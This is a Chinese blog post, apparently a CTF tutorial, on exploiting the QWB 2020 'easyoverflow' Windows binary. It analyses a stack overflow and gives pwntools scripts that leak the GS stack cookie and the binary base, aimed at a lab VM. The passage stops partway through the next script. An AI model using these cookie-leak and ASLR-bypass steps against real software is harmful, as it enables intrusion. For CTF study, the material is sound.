<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="文章首发于先知社区 上两节都是保护机制几乎都没开的情况下，这一节就开始学习绕过ASLR和GS  win pwn初探（三）这里以强网杯2020的easyoverflow来练习学习 查看保护  没有开SafeSEH和CFG，其他重要的保护都开了 程序分析123456789101112131415161718192021222324252627int __cdecl main(int argc, co">
<meta property="og:type" content="article">
<meta property="og:title" content="win pwn初探（三）">
<meta property="og:url" content="https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="文章首发于先知社区 上两节都是保护机制几乎都没开的情况下，这一节就开始学习绕过ASLR和GS  win pwn初探（三）这里以强网杯2020的easyoverflow来练习学习 查看保护  没有开SafeSEH和CFG，其他重要的保护都开了 程序分析123456789101112131415161718192021222324252627int __cdecl main(int argc, co">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/1.png">
<meta property="article:published_time" content="2022-12-03T01:45:15.000Z">
<meta property="article:modified_time" content="2023-08-17T06:34:14.629Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="win pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>win pwn初探（三）</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="z1r0's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;text=win pwn初探（三）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（三）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=win pwn初探（三）&amp;body=Check out this article: https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;name=win pwn初探（三）&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;t=win pwn初探（三）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（三）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2StackCookie"><span class="toc-number">1.3.1.</span> <span class="toc-text">泄露StackCookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2binary-base"><span class="toc-number">1.3.2.</span> <span class="toc-text">泄露binary base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dll"><span class="toc-number">1.3.3.</span> <span class="toc-text">ret2dll</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        win pwn初探（三）
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-12-03T01:45:15.000Z" itemprop="datePublished">2022-12-03</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/study/">study</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/win-pwn/" rel="tag">win pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>文章首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11913">先知社区</a></p>
<p>上两节都是保护机制几乎都没开的情况下，这一节就开始学习绕过ASLR和GS</p>
</blockquote>
<h1 id="win-pwn初探（三）"><a href="#win-pwn初探（三）" class="headerlink" title="win pwn初探（三）"></a>win pwn初探（三）</h1><p>这里以强网杯2020的<a target="_blank" rel="noopener" href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip">easyoverflow</a>来练习学习</p>
<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/1.png" alt="1" style="zoom:50%;">

<p>没有开SafeSEH和CFG，其他重要的保护都开了</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0</span>i64);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0</span>i64);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0</span>i64);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个程序很简单，read这里的DstBuf，可以输入0x400大小的数据，而DestBuf是256的空间，所以存在一个栈溢出漏洞</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露StackCookie"><a href="#泄露StackCookie" class="headerlink" title="泄露StackCookie"></a>泄露StackCookie</h3><p>在CTF的PWN中，因为有canary的存在，所以先泄露出canary，再泄露出程序基地址，最后利用ret2libc3即可攻击成功</p>
<p>在win中的利用也很相似，首先需要泄露出<code>StackCookie</code>这个东西，看一下汇编，这个东西是怎么放入程序的一些地址中的</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    rbx</span><br><span class="line">sub     rsp, 130h</span><br><span class="line">mov     rax, cs:__security_cookie</span><br><span class="line">xor     rax, rsp</span><br><span class="line">mov     [rsp+138h+var_18], rax</span><br></pre></td></tr></tbody></table></figure>

<p>在程序开头会将<code>__security_cookie</code>放入rax，然后与rsp进行异或，之后把异或的结果（<code>StackCookie</code>）存放在<code>rsp + 138h + var_18</code>中，再看一下程序的最后</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor     eax, eax</span><br><span class="line">mov     rcx, [rsp+138h+var_18]</span><br><span class="line">xor     rcx, rsp        ; StackCookie</span><br><span class="line">call    __security_check_cookie</span><br><span class="line">add     rsp, 130h</span><br><span class="line">pop     rbx</span><br><span class="line">retn</span><br></pre></td></tr></tbody></table></figure>

<p>程序结束前会把<code>rsp + 138h + var_18</code>里面的值给到rcx，也就是把上面<code>StackCookie</code>与rsp异或之后的值给rcx，然后再经过一次异或（这样的话<code>StackCookie</code>的值就会回到<code>__security_cookie</code>），最后与<code>__security_cookie</code>进行比较，如果相等则继续，不相等则crash掉</p>
<p>先构造以下poc测试一下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">8</span></span><br><span class="line">r.sendlineafter(<span class="string">'input:'</span>, p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>然后在<code>puts("buffer:");</code>这里下个断点，之后看一下rsp的布局</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp</span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>840  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>850  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000002</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>860  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">00000000</span>`<span class="number">0000000</span>a</span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>870  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>880  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>890  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>8a0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看到8个a已经被写入，上面的<code>StackCookie</code>会存到<code>rsp + 0x138 - 0x18</code>中，所以看一下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp + <span class="number">0x138</span> - <span class="number">0x18</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>960  <span class="number">00005f</span>b0`<span class="number">2</span>d14eecc <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>970  <span class="number">000002e8</span>`<span class="number">94297480</span> <span class="number">00007f</span>f6`<span class="number">71</span>ad12f4</span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>980  <span class="number">000000</span>ee`<span class="number">9973f</span>9e0 <span class="number">00007f</span>f6`<span class="number">71</span>ad136d</span><br></pre></td></tr></tbody></table></figure>

<p>此时程序的StackCookie是<code>00005fb0 2d14eecc</code>这个值也就是<code>0x5fb02d14eecc</code>，看一下输入的buf距离这个地址多少，<code>ee9973f960 - ee9973f860 = 0x100 </code>，所以编写poc泄露出<code>StackCookie</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendlineafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>调试一下看一下泄露的是否正确</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp + <span class="number">0x130</span> - <span class="number">0x18</span></span><br><span class="line"><span class="number">00000057</span>`f0bcfc88  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">00002447</span>`<span class="number">1</span>d701f43</span><br><span class="line"><span class="number">00000057</span>`f0bcfc98  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000185</span>`<span class="number">4b</span>f47480</span><br><span class="line"><span class="number">00000057</span>`f0bcfca8  <span class="number">00007f</span>f6`<span class="number">637112f</span>4 <span class="number">00000057</span>`f0bcfd10</span><br><span class="line"><span class="number">00000057</span>`f0bcfcb8  <span class="number">00007f</span>f6`<span class="number">6371136</span>d <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000057</span>`f0bcfcc8  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看到<code>StackCookie</code>的值是<code>0x24471d701f43</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x119</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">62</span> <span class="number">75</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">65</span> <span class="number">72</span> <span class="number">3</span>a <span class="number">0</span>d  <span class="number">0</span>a <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │buff│er:·│·aaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000100</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">43</span> <span class="number">1f</span> <span class="number">70</span>  <span class="number">1</span>d <span class="number">47</span> <span class="number">24</span> <span class="number">0</span>d  │aaaa│aaaa│aC·p│·G$·│</span><br><span class="line">    <span class="number">00000110</span>  <span class="number">0</span>a <span class="number">69</span> <span class="number">6</span>e <span class="number">70</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">3</span>a <span class="number">0</span>d  <span class="number">0</span>a                        │·inp│ut:·│·│</span><br><span class="line">    <span class="number">00000119</span></span><br><span class="line">StackCookie = <span class="number">0x24471d701f43</span></span><br></pre></td></tr></tbody></table></figure>

<p>poc里面<code>StackCookie</code>和上面调试的一样</p>
<h3 id="泄露binary-base"><a href="#泄露binary-base" class="headerlink" title="泄露binary base"></a>泄露binary base</h3><p>因为这个程序三次循环，只要最后的StackCookie正确就不会crash，所以第二次可以泄露出程序的基地址，也就是覆盖rbp，后面就会连带返回值一起泄露出来，poc如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>运行即可成功泄露出返回地址，此时就可以算出binary base</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> 